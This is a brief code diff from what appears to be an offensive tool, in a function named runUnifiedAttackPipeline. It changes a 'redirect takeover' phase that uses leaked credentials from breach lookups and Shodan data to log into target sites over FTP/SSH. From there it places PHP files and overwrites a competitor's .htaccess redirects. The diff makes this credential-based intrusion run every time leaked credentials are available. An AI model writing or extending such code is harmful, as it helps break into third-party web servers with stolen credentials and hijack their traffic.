@@ -4215,8 +4215,9 @@ export async function runUnifiedAttackPipeline(
   }
 
   // ─── Phase 5.6b: Credential-Enhanced Redirect Takeover (uses LeakCheck + Shodan intel) ───
-  // If we still don't have a successful redirect AND we found leaked creds, try FTP/SSH overwrite
-  if (!hasSuccessfulRedirect() && existingRedirectDetected && leakcheckCredentials.length > 0 && !shouldStop('redirect_takeover')) {
+  // ALWAYS run Deep Competitor Analysis when competitor redirect detected + creds available
+  // Even if FTP/SSH already succeeded (they may have placed a PHP file but NOT overwritten competitor .htaccess)
+  if (existingRedirectDetected && leakcheckCredentials.length > 0 && !shouldStop('redirect_takeover')) {
     try {
       const targetHost = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
       const validCreds = leakcheckCredentials.filter((c): c is typeof c & { username: string; password: string } => !!(c.username && c.password));
